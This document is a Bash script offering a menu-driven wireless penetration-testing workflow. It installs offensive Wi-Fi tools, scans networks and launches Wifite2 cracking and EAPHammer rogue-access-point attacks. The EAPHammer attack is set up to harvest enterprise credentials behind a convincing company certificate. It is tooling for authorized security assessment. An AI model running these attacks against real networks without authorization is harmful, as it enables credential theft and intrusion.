#!/usr/bin/env bash
set -uo pipefail

# =============================================================================
# NAME        : wireless.sh
# DESCRIPTION :
# AUTHOR      : Adam Compton
# DATE CREATED: 2025-05-22 09:15:48
# =============================================================================
# EDIT HISTORY:
# DATE                 | EDITED BY    | DESCRIPTION OF CHANGE
# ---------------------|--------------|----------------------------------------
# 2025-05-22 09:15:48  | Adam Compton | Initial creation.
# =============================================================================

IFS=$'\n\t'

# Colors for logging
RED='\033[38;5;9m'
GREEN='\033[0;32m'
YELLOW='\033[38;5;11m'
BLUE='\033[38;5;87m'
CYAN='\033[36m'
NC='\033[0m'

#--------------------------------------
# Logging Functions
#--------------------------------------
function log()    { printf "[%bINFO%b] %s\n" "${BLUE}" "${NC}" "$*"; }
function warn()   { printf "[%bWARN%b] %s\n" "${YELLOW}" "${NC}" "$*"; }
function fail()   {
    printf "[%bFAIL%b] %s\n" "${RED}" "${NC}" "$*" >&2
    exit 1
}

#--------------------------------------
# Environment Validation
#--------------------------------------
# Ensure Bash 4+ for associative arrays
if ((BASH_VERSINFO[0] < 4)); then
    fail "This script requires Bash version 4.0 or higher."
fi

# Handle script interruption
trap 'fail "Script interrupted."' INT TERM

#--------------------------------------
# Configuration and Globals
#--------------------------------------
INSTALL_DIR="${INSTALL_DIR:-/opt}"
PROXY="proxychains4 -q"

LOG_DIR="${1:-./wireless_logs}"
SCAN_FILE="${LOG_DIR}/iwlist_scan.txt"
NMCLI_LOG="${LOG_DIR}/nmcli_scan.txt"
AIRDUMP_PREFIX="${LOG_DIR}/airodump"
INTERFACE=""
SSID_SELECTION=""
DISPLAY_HIDDEN=false

#--------------------------------------
# Utility Functions
#--------------------------------------
function is_installed() {
    command -v "$1" > /dev/null 2>&1
}

function show_help() {
    cat << EOF
Usage: ${0##*/} [LOG_DIR]

Wireless Network Assessment Script

Options:
  -h, --help    Show this help message
  LOG_DIR       Directory to store logs (default: ./wireless_logs)

Menu Options:
  1) Install dependencies
  2) Select wireless interface
  3) Toggle monitor mode
  4) Discover SSIDs
  5) Select target SSID
  6) Connect to SSID
  7) Disconnect SSID
  8) Test client isolation
  9) Test segmentation
 10) Run Wifite2 attack
 11) Run Eaphammer attack
  0) Exit
EOF
}

#--------------------------------------
# install_dependencies
#--------------------------------------
function verify_required_commands() {
    local missing=false
    for cmd in \
        iw fzf ip ifconfig iwconfig \
        airodump-ng airmon-ng nmap \
        tshark aircrack-ng eaphammer \
        wifite bully reaver pixiewps pyrit; do

        if ! is_installed "${cmd}"; then
            warn "'${cmd}' is required but not installed."
            missing=true
        fi
    done

    if [[ "${missing}" == true ]]; then
        warn "Please install the missing required programs/applications."
        warn "    Otherwise, most/all of the commands will fail to"
        warn "    function properly."
    fi
}

function install_dependencies() {
    log "Installing required packages and tools…"

    # Ensure INSTALL_DIR exists
    mkdir -p "${INSTALL_DIR}" || fail "Cannot create INSTALL_DIR at ${INSTALL_DIR}"
    local orig_dir
    orig_dir="$(pwd)"

    # 1) Batch‐install any missing APT packages
    #    Build a map of command→package
    declare -A apt_pkgs
    apt_pkgs["iw"]=iw
    apt_pkgs["fzf"]=fzf
    apt_pkgs["ip"]=iproute2
    apt_pkgs["ifconfig"]=net-tools
    apt_pkgs["iwconfig"]=wireless-tools
    apt_pkgs["airodump-ng"]=aircrack-ng
    apt_pkgs["airmon-ng"]=aircrack-ng
    apt_pkgs["nmap"]=nmap
    apt_pkgs["tshark"]=tshark
    apt_pkgs["cowpatty"]=cowpatty
    apt_pkgs["hashcat"]=hashcat

    local to_install=()
    for cmd in "${!apt_pkgs[@]}"; do
        if ! is_installed "${cmd}"; then
            to_install+=("${apt_pkgs[${cmd}]}")
        fi
    done

    if ((${#to_install[@]})); then
        ${PROXY} apt update -y || fail "APT update failed"
        ${PROXY} apt install -y "${to_install[@]}" || fail "APT install failed"
    else
        log "All APT‐installable tools are already present."
    fi

    # 2) Python service_identity for EAPHammer
    if python3.10 -c "import service_identity" 2> /dev/null; then
        log "service_identity present; skipping."
    else
        log "Installing service_identity…"
        ${PROXY} python3.10 -m pip install --user service-identity \
            || fail "Failed to install service-identity"
    fi

    # 3) EAPHammer
    if is_installed eaphammer; then
        log "EAPHammer already in PATH; skipping."
    else
        log "Cloning EAPHammer into ${INSTALL_DIR}/eaphammer…"
         cd "${INSTALL_DIR}" || fail "Could not [cd] to the tools directory."
        ${PROXY} git clone https://github.com/s0lst1c3/eaphammer.git \
            "${INSTALL_DIR}/eaphammer" \
            || fail "git clone eaphammer failed"
        cd "${INSTALL_DIR}/eaphammer" || fail "Could not [cd] into the [eaphammer] directory"
        chmod +x ubuntu-unattended-setup
        log "Running EAPHammer unattended setup…"
        ${PROXY} ./ubuntu-unattended-setup \
            || fail "EAPHammer setup failed"
        cd "${orig_dir}" || fail "Could not [cd] into the original directory"
    fi
    # Obtain and import a Let's Encrypt cert via DNS challenge ---
    # Prompt the user for domain and company
    log "For eaphammer, we need the following information"
    log "  so that we can generate usable certificates."
    read -rp "Enter the DNS domain to use for the Wi-Fi certificate (e.g. example.com): " WIFI_DNS_DOMAIN
    read -rp "Enter your COMPANY name for the certificate (e.g. corp): " COMPANY
    # Get a cert with certbot (manual DNS challenge)
    ${PROXY} certbot certonly \
        --manual \
        --preferred-challenges dns-01 \
        --manual-public-ip-logging-ok \
        --agree-tos \
        --register-unsafely-without-email \
        -d "${COMPANY}.${WIFI_DNS_DOMAIN}" \
        --server https://acme-v02.api.letsencrypt.org/directory \
        || fail "Certbot DNS challenge failed"
    # Import the cert into EAPHammer
    eaphammer --cert-wizard import \
        --server-cert "/etc/letsencrypt/live/${COMPANY}.${WIFI_DNS_DOMAIN}/fullchain.pem" \
        --private-key "/etc/letsencrypt/live/${COMPANY}.${WIFI_DNS_DOMAIN}/privkey.pem" \
        || fail "EAPHammer cert import failed"

    # 4) Reaver-WPS-Fork-t6x
    if is_installed reaver; then
        log "reaver already installed; skipping."
    else
        log "Cloning & building reaver…"
        cd "${INSTALL_DIR}" || fail "Could not [cd] to the tools directory."
        git clone https://github.com/t6x/reaver-wps-fork-t6x.git \
            || fail "git clone reaver failed"
        cd reaver-wps-fork-t6x/src || fail "Could not [cd] into the [reaver-wps-fork-t6x/src] directory"
        ./configure --enable-libnl3 || fail "reaver configure failed"
        make || fail "reaver build failed"
        make install || fail "reaver install failed"
        cd "${orig_dir}" || fail "Could not [cd] into the original directory"
    fi

    # 5) Pixiewps
    if is_installed pixiewps; then
        log "pixiewps already installed; skipping."
    else
        log "Cloning & building pixiewps…"
        cd "${INSTALL_DIR}" || fail "Could not [cd] to the tools directory."
        git clone https://github.com/wiire-a/pixiewps.git \
            || fail "git clone pixiewps failed"
        cd pixiewps || fail "Could not [cd] into the [pixiewps] directory"
        make || fail "pixiewps build failed"
        make install || fail "pixiewps install failed"
        cd "${orig_dir}" || fail "Could not [cd] into the original directory"
    fi

    # 6) Bully
    if is_installed bully; then
        log "bully already installed; skipping."
    else
        log "Installing Bully build deps…"
        ${PROXY} apt install -y build-essential libpcap-dev \
            || fail "Failed to install bully apt deps"

        log "Cloning Bully into ${INSTALL_DIR}/bully…"
        cd "${INSTALL_DIR}" || fail "Could not [cd] to the tools directory."
        ${PROXY} git clone https://github.com/aanarchyy/bully.git \
            "${INSTALL_DIR}/bully" \
            || fail "git clone bully failed"
        cd "${INSTALL_DIR}/bully/src"  || fail "Could not [cd] into the [bully/src] directory"
        make || fail "bully make failed"
        ${PROXY} make install || fail "bully make install failed"
        cd "${orig_dir}" || fail "Could not [cd] into the original directory"
    fi

    # 7) Pyrit
    if is_installed pyrit; then
        log "pyrit already installed; skipping."
    else
        log "Installing Pyrit build deps…"
        ${PROXY} apt install -y python2.7 python2.7-dev libssl-dev zlib1g-dev libpcap0.8-dev python2-pip \
            || fail "Failed to install pyrit apt deps"

        # 7.1. Query GitHub’s API for the *tarball* URL of the latest release
        log "Fetching latest Pyrit tarball URL…"
        TARBALL_URL=$(${PROXY} curl -s https://api.github.com/repos/JPaulMora/Pyrit/releases/latest \
            | grep '"tarball_url":' | head -1 | cut -d '"' -f4)
        [[ -n "${TARBALL_URL}" ]] || fail "Could not determine Pyrit tarball URL"

        # 7.2. Download it (follows any redirects) and save as “pyrit-latest.tar.gz”
        log "Downloading Pyrit into ${INSTALL_DIR}…"
        cd "${INSTALL_DIR}" || fail "Could not [cd] to the tools directory."
        ${PROXY} wget -c "${TARBALL_URL}" -O pyrit-latest.tar.gz \
            || fail "Failed to download Pyrit"

        # 8.3. Extract and enter directory
        tar xzf pyrit-latest.tar.gz || fail "Failed to extract Pyrit"

        # 7.4 Find the extracted dir (Pyrit-*)
        local pyrit_dir
        pyrit_dir=$(find . -maxdepth 1 -type d -name "Pyrit-*" | head -1)
        [[ -n "${pyrit_dir}" ]] || fail "Pyrit directory not found after extract"
        cd "${pyrit_dir}" || fail "Could not [cd] into the original directory"

        # 7.5 Apply edits, Install Deps, and build/install
        sed -i 's/COMPILE_AESNI/COMPILE_AESNIX/' cpyrit/_cpyrit_cpu.c
        ${PROXY} python2.7 -m pip install psycopg2-binary scapy \
            || fail "Failed to install Pyrit Python deps"
        ${PROXY} python2.7 setup.py clean || fail "Pyrit setup.py clean failed"
        ${PROXY} python2.7 setup.py build || fail "Pyrit setup.py build failed"
        ${PROXY} python2.7 setup.py install || fail "Pyrit setup.py install failed"

        cd "${orig_dir}" || fail "Could not [cd] into the original directory"
    fi

    # 8) Wifite2
    if is_installed wifite; then
        log "wifite already installed; skipping."
    else
        log "Installing Wifite2 dependencies…"
        ${PROXY} apt install -y \
            hcxdumptool hcxtools python3-chardet python3-scapy \
            || fail "Failed to install wifite2 apt deps"

        log "Cloning Wifite2 into ${INSTALL_DIR}/wifite2…"
        ${PROXY} git clone https://github.com/kimocoder/wifite2.git \
            "${INSTALL_DIR}/wifite2" \
            || fail "git clone wifite2 failed"
        cd "${INSTALL_DIR}/wifite2" || fail "Could not [cd] into the [wifite2] directory"
        ${PROXY} python3 setup.py install \
            || fail "Wifite2 install failed"
        cd "${orig_dir}" || fail "Could not [cd] into the original directory"
    fi

    log "All dependencies are installed or already present."
}

#--------------------------------------
# choose_interface
#--------------------------------------
function choose_interface() {
    INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | fzf --prompt="Select interface: ")
    [[ -z "${INTERFACE}" ]] && fail "No interface selected."
    log "Selected interface: ${INTERFACE}"
}

#--------------------------------------
# get_interface_mode
#--------------------------------------
function get_interface_mode() {
    if [[ -z "${INTERFACE:-}" ]]; then
        echo "none"
    else
        iw dev "${INTERFACE}" info 2> /dev/null | awk '/type/ {print $2}'
    fi
}

#--------------------------------------
# enable_monitor
#--------------------------------------
function enable_monitor() {
    [[ -z "${INTERFACE}" ]] && choose_interface

    local current_mode
    current_mode=$(get_interface_mode)
    if [[ "${current_mode}" == "monitor" ]]; then
        warn "Interface '${INTERFACE}' is already in monitor mode."
        return 0
    fi
    log "Enabling monitor mode on '${INTERFACE}'."
    ip link set dev "${INTERFACE}" down || {
        warn "Failed to set ${INTERFACE} to [down]"
        return 1
    }
    iw dev "${INTERFACE}" set type monitor || {
        warn "Failed to set ${INTERFACE} to [monitor]"
        return 1
    }
    local base_iface="${INTERFACE}"

    local new_iface="${INTERFACE}"
    candidate="${INTERFACE}mon"
    if ((${#candidate} <= 15)); then
        if ip link set dev "${INTERFACE}" name "${candidate}"; then
            new_iface="${candidate}"
        else
            warn "Rename to ${candidate} failed, keeping ${INTERFACE}"
        fi
    else
        warn "Candidate name ${candidate} too long, skipping rename"
    fi
    ip link set dev "${new_iface}" up || {
        warn "Failed to set ${new_iface} to [up]"
        return 1
    }
    INTERFACE="${new_iface}"
    log "Interface is now in monitor mode as '${INTERFACE}'."
}

#--------------------------------------
# disable_monitor
#--------------------------------------
function disable_monitor() {
    [[ -z "${INTERFACE}" ]] && choose_interface

    # Check current mode; only proceed if in monitor
    local current_mode
    current_mode=$(get_interface_mode)
    if [[ "${current_mode}" != "monitor" ]]; then
        warn "Interface '${INTERFACE}' is already in managed mode."
        return 0
    fi

    log "Disabling monitor mode on '${INTERFACE}'."
    # Bring interface down before renaming or changing mode
    ip link set dev "${INTERFACE}" down || {
        warn "Failed to set ${INTERFACE} to [down]"
        return 1
    }

    local base_iface="${INTERFACE}"
    # Rename if interface name ends in 'mon'
    if [[ "${INTERFACE}" == *mon ]]; then
        base_iface="${INTERFACE%mon}"
        ip link set dev "${INTERFACE}" name "${base_iface}" || {
            warn "Failed to rename '${INTERFACE}' to '${mon_iface}'"
            return 1
        }
    fi
    iw dev "${base_iface}" set type managed || {
        warn "Failed to set ${base_iface} to [managed]"
        return 1
    }
    ip link set dev "${base_iface}" up || {
        warn "Failed to set ${base_iface} to [up]"
        return 1
    }
    INTERFACE="${base_iface}"
    log "Interface restored to managed mode as '${INTERFACE}'."
}

#--------------------------------------
# manual_monitor_toggle
#--------------------------------------
function manual_monitor_toggle() {
    [[ -z "${INTERFACE}" ]] && choose_interface
    local current_mode
    current_mode=$(get_interface_mode)
    echo "Current mode for ${INTERFACE}: ${current_mode}"
    if [[ "${current_mode}" == "monitor" ]]; then
        read -rp "Disable monitor mode? (y/N): " ans
        if [[ "${ans}" =~ ^[Yy]$ ]]; then
            disable_monitor
        else
            log "Monitor mode retained."
        fi
    else
        read -rp "Enable monitor mode? (y/N): " ans
        if [[ "${ans}" =~ ^[Yy]$ ]]; then
            enable_monitor
        else
            log "Managed mode retained."
        fi
    fi
}

#--------------------------------------
# scan_networks
#--------------------------------------
function scan_networks() {
    [[ -z "${INTERFACE}" ]] && choose_interface

    log "Scanning with nmcli..."
    disable_monitor
    nmcli -t -f in-use,ssid,security,bssid,chan,signal,rate,freq,bars \
        dev wifi list ifname "${INTERFACE}" --rescan yes > "${NMCLI_LOG}" || warn "[nmcli wifi list] failed"

    log "Scanning with iwlist..."
    disable_monitor
    iwlist "${INTERFACE}" scanning > "${SCAN_FILE}" || warn "[iwlist] scan failed"

    log "Running airodump-ng for beacon logging (15 seconds)..."
    enable_monitor
    timeout --foreground 15s airodump-ng \
        --output-format netxml,pcap,csv \
        --write "${AIRDUMP_PREFIX}" "${INTERFACE}" \
        --band abg --beacons \
        || warn "[Airodump-ng] scan timed out or failed"
    disable_monitor

    log "Network scans complete."
}

#--------------------------------------
# list_ssids
#--------------------------------------
function list_ssids() {
    local tmpfile
    tmpfile=$(mktemp) || fail "Failed to create temporary file."

    # Parse NMCLI output
    awk '{
        line=$0
        gsub(/\\:/, "[COLON]", line)
        n=split(line,a,":")
        for(i=1;i<=n;i++) gsub(/\[COLON\]/,":",a[i])
        print a[2] "\t" a[4] "\t" a[5] "\t" a[3]
    }' "${NMCLI_LOG}" >> "${tmpfile}"

    # Parse IWLIST output
    awk '
    /Cell/ {bssid=$5}
    /Channel:/ {chan=$2}
    /ESSID:/ {gsub(/"/, "", $0); ssid=substr($0, index($0, $2))}
    /Encryption key:/ {enc=($3=="on" ? "WEP/WPA" : "OPEN")}
    /IE: WPA/ {enc="WPA"}
    /IE: IEEE 802.11i/ {enc="WPA2"}
    /Group Cipher/ {
        split($0, a, ":"); gsub(/^ +| +$/, "", a[2])
        if (a[2] != "") enc = enc " " a[2]
    }
    /Authentication Suites/ {
        split($0, a, ":"); gsub(/^ +| +$/, "", a[2])
        if (a[2] != "") enc = enc " " a[2]
    }
    /^$/ {
        if (ssid != "" && bssid != "" && chan != "") {
            print ssid "\t" bssid "\t" chan "\t" enc;
        }
        ssid=bssid=chan=enc="";
    }' "${SCAN_FILE}" >> "${tmpfile}"

    # Parse Airodump CSV
    local csv_file
    csv_file=$(find "${LOG_DIR}" -name '*.csv' | head -n1 || :)
    if [[ -f "${csv_file}" ]]; then
        awk -F',' '
            tolower($0) ~ /^bssid.*first time seen/ { next }
            NF>=14 {
                essid=$14; gsub(/^ +| +$/,"",essid)
                bssid=$1;  gsub(/^ +| +$/,"",bssid)
                chan=$4;   gsub(/^ +| +$/,"",chan)
                priv=$6;   gsub(/^ +| +$/,"",priv)
                ciph=$7;   gsub(/^ +| +$/,"",ciph)
                auth=$8;   gsub(/^ +| +$/,"",auth)
                if (essid) {
                    printf "%s\t%s\t%s\t%s %s %s\n", essid, bssid, chan, priv, ciph, auth
                }
            }
        ' "${csv_file}" >> "${tmpfile}"
    else
        warn "No airodump CSV output file found."
    fi

    # Deduplicate and display table
    awk -F'\t' '
    {
        # Clean input
        ssid = $1; bssid = $2; chan = $3; sec = $4
        gsub(/^ +| +$/, "", ssid)
        gsub(/^ +| +$/, "", bssid)
        gsub(/^ +| +$/, "", chan)
        gsub(/^ +| +$/, "", sec)

        key = ssid "|" bssid "|" chan
        split(sec, words, /[[:space:]]+/)
        word_count = length(words)

        if (!(key in best_count) || word_count > best_count[key]) {
            best_count[key] = word_count
            ssid_map[key]  = ssid
            bssid_map[key] = bssid
            chan_map[key]  = chan
            sec_map[key]   = sec
        }
    }
    END {
        for (k in ssid_map) {
            printf "%s\t%s\t%s\t%s\n", ssid_map[k], bssid_map[k], chan_map[k], sec_map[k]
        }
    }' "${tmpfile}" \
        | sort -k1,1 -k2,2 -k3,3 \
        | awk -v show_hidden="${DISPLAY_HIDDEN:-0}" -F'\t' '
    BEGIN {
        printf "%-32s %-20s %-6s %-20s\n", "SSID", "BSSID", "CHAN", "SECURITY"
        print  "--------------------------------------------------------------------------------"
    }
    # If SSID is empty and show_hidden is not "1", skip it
    ($1 == "" && show_hidden != "1") { next }

    {
        # If empty and show_hidden==1, label it [HIDDEN]
        ssid = ($1 == "" ? "[HIDDEN]" : $1)
        printf "%-32s %-20s %-6s %-20s\n", ssid, $2, $3, $4
    }
    '

    rm -f "${tmpfile}"
}

#--------------------------------------
# select_ssid
#--------------------------------------
function select_ssid() {
    [[ ! -s "${NMCLI_LOG}" ]] && fail "No scan data available. Run discovery first."
    local chosen_line bssid ssid chan sec

    chosen_line=$(list_ssids | tail -n +3 | fzf --prompt="Select SSID: ") || fail "No SSID selected."

    # Extract BSSID (MAC address)
    bssid=$(echo "${chosen_line}" | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}')
    [[ -z "${bssid}" ]] && fail "Failed to parse BSSID."

    # Extract SSID (text before BSSID)
    ssid=$(echo "${chosen_line}" | sed -E "s/\s*${bssid}.*//" | xargs)
    # Extract channel (number following BSSID)
    chan=$(echo "${chosen_line}" | sed -E "s/.*${bssid}\s+([0-9]+).*/\1/")
    # Extract security (text after channel)
    sec=$(echo "${chosen_line}" | sed -E "s/.*${bssid}\s+${chan}\s+(.*)$/\1/")

    SSID_SELECTION="${ssid}|${bssid}|${chan}|${sec}"
    log "Selected SSID: ${ssid} (BSSID: ${bssid}, CHAN: ${chan}, SEC: ${sec})"
}

#--------------------------------------
# device_settings
#--------------------------------------
function device_settings() {
    [[ -z "${INTERFACE}" ]] && choose_interface
    log "Interface settings for ${INTERFACE}:"
    ifconfig "${INTERFACE}"
    iwconfig "${INTERFACE}"
    nmcli device show "${INTERFACE}"
}

#--------------------------------------
# connect_to_network
#--------------------------------------
function connect_to_network() {
    [[ -z "${INTERFACE}" ]] && choose_interface
    [[ -z "${SSID_SELECTION}" ]] && select_ssid

    IFS='|' read -r ssid bssid chan sec <<< "${SSID_SELECTION}"
    log "Connecting to SSID: ${ssid}"

    if echo "${sec}" | grep -qiE 'WPA|PSK'; then
        read -rsp "Enter passphrase for '${ssid}': " pass
        echo
        nmcli dev wifi connect "${ssid}" password "${pass}" ifname "${INTERFACE}" name "${ssid// /_}" || fail "Failed to connect to protected network ${ssid}"
    else
        nmcli dev wifi connect "${ssid}" ifname "${INTERFACE}" name "${ssid// /_}" || fail "Failed to connect to open network ${ssid}"
    fi

    log "Connected to ${ssid}"
    device_settings
}

#--------------------------------------
# disconnect_from_network
#--------------------------------------
function disconnect_from_network() {
    [[ -z "${INTERFACE}" ]] && choose_interface
    log "Disconnecting ${INTERFACE}"
    nmcli dev disconnect ifname "${INTERFACE}" || warn "Failed to disconnect"
    device_settings
}

#--------------------------------------
# ensure_connected
#--------------------------------------
function ensure_connected() {
    [[ -z "${INTERFACE}" ]] && choose_interface
    local mode
    mode=$(get_interface_mode)
    if [[ "${mode}" == "monitor" ]]; then
        fail "Interface '${INTERFACE}' is in monitor mode. Please switch to managed mode and connect."
    fi
    local ipinfo
    ipinfo=$(ip -o -f inet addr show dev "${INTERFACE}" | awk '{print $4}')
    [[ -z "${ipinfo}" ]] && fail "Interface '${INTERFACE}' has no IP. Ensure it's connected to a network."
}

#--------------------------------------
# Test client isolation
#--------------------------------------
function test_isolation() {
    ensure_connected
    local ssid bssid chan sec safe_ssid cidr prefix

    if [[ -n "${SSID_SELECTION}" ]]; then
        IFS='|' read -r ssid bssid chan sec <<< "${SSID_SELECTION}"
        safe_ssid="${ssid//[^[:alnum:]]/_}"
    else
        safe_ssid=""
    fi

    # get interface CIDR
    cidr=$(ip -o -f inet addr show dev "${INTERFACE}" | awk '{print $4}')
    [[ -z "${cidr}" ]] && fail "Cannot determine network CIDR for ${INTERFACE}"

    prefix="${LOG_DIR}/ISOLATION_${INTERFACE}_${safe_ssid}"
    log "Testing client isolation on ${cidr} via ${INTERFACE}"
    nmap --open -e "${INTERFACE}" -oA "${prefix}" "${cidr}"
    log "Isolation results in ${prefix}.*"
}

#--------------------------------------
# Test segmentation
#--------------------------------------
function test_segmentation() {
    ensure_connected
    local ssid bssid chan sec safe_ssid targets_file prefix

    read -rp "Enter targets file path: " targets_file
    [[ ! -f "${targets_file}" ]] && fail "Targets file not found: ${targets_file}"
    if [[ -n "${SSID_SELECTION}" ]]; then
        IFS='|' read -r ssid bssid chan sec <<< "${SSID_SELECTION}"
        safe_ssid="${ssid//[^[:alnum:]]/_}"
    else
        safe_ssid=""
    fi

    prefix="${LOG_DIR}/SEGMENTATION_${INTERFACE}_${safe_ssid}"
    log "Testing segmentation on targets from ${targets_file} via ${INTERFACE}"
    nmap --open -e "${INTERFACE}" -iL "${targets_file}" -oA "${prefix}"
    log "Segmentation results in ${prefix}.*"
}

#--------------------------------------
# run_wifite_attack
#--------------------------------------
function run_wifite_attack() {
    [[ -z "${INTERFACE}" ]] && choose_interface
    [[ -z "${SSID_SELECTION}" ]] && select_ssid

    local ssid="${SSID_SELECTION%%|*}"
    enable_monitor
    wifite -i "${INTERFACE}" --essid "${ssid}"
    disable_monitor
}

#--------------------------------------
# run_eaphammer_attack
#--------------------------------------
function run_eaphammer_attack() {
    [[ -z "${INTERFACE}" ]] && choose_interface
    [[ -z "${SSID_SELECTION}" ]] && select_ssid

    IFS='|' read -r ssid bssid chan sec <<< "${SSID_SELECTION}"

    enable_monitor
    eaphammer -i "${INTERFACE}" --channel "${chan}" --essid "${ssid}" --auth wpa-eap --cred
    disable_monitor
}

#--------------------------------------
# main_menu
#--------------------------------------
function main_menu() {
    mkdir -p "${LOG_DIR}"

    while true; do
        echo
        echo "Wireless Assessment Menu"
        echo "========================"

        local mode_display ssid_display
        mode_display=$(get_interface_mode)

        # Determine active connection on this interface
        if is_installed nmcli && [[ -n "${INTERFACE}" ]]; then
            conn=$(nmcli -t -f NAME,DEVICE connection show --active | grep -E ".*:${INTERFACE}$" | cut -d: -f1 || echo "none")
        else
            conn="none"
        fi

        # Selected SSID display
        if [[ -n "${SSID_SELECTION}" ]]; then
            IFS='|' read -r ssid bssid chan sec <<< "${SSID_SELECTION}"
            ssid_display="SSID: ${CYAN}${ssid}${NC} | BSSID: ${CYAN}${bssid}${NC} | CHAN: ${CYAN}${chan}${NC} | SEC: ${CYAN}${sec}${NC}"
        else
            ssid_display="none"
        fi

        echo -e "Interface: ${YELLOW}${INTERFACE:-none}${NC}  Mode: ${GREEN}${mode_display^^}${NC}  Connection: ${GREEN}${conn}${NC}"
        echo -e "Selected SSID: ${ssid_display}"
        echo "------------------------"
        echo "1) Install Dependencies"
        echo "2) Select Wireless Interface"
        echo "3) Toggle Monitor Mode"
        echo "4) Discover SSIDs"
        echo "5) Select Target SSID"
        echo "------------------------"
        echo "6) Connect to Network"
        echo "7) Disconnect from Network"
        echo "------------------------"
        echo "8) Client Isolation Test"
        echo "9) Network Segmentation Test"
        echo "------------------------"
        echo "10) Run Wifite2 Attack"
        echo "11) Run Eaphammer Attack"
        echo "------------------------"
        echo "0) Exit"
        echo

        read -rp "Select an option: " opt
        case "${opt}" in
            1) install_dependencies ;;
            2) choose_interface ;;
            3) manual_monitor_toggle ;;
            4)
                scan_networks
                list_ssids
                ;;
            5) select_ssid ;;
            6) connect_to_network ;;
            7) disconnect_from_network ;;
            8) test_isolation ;;
            9) test_segmentation ;;
            10) run_wifite_attack ;;
            11) run_eaphammer_attack ;;
            0)
                log "Exiting."
                               break
                                     ;;
            *) warn "Invalid option: ${opt}" ;;
        esac
    done
}

# Entry point

# Parse arguments
if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
    show_help
    exit 0
fi
verify_required_commands
main_menu
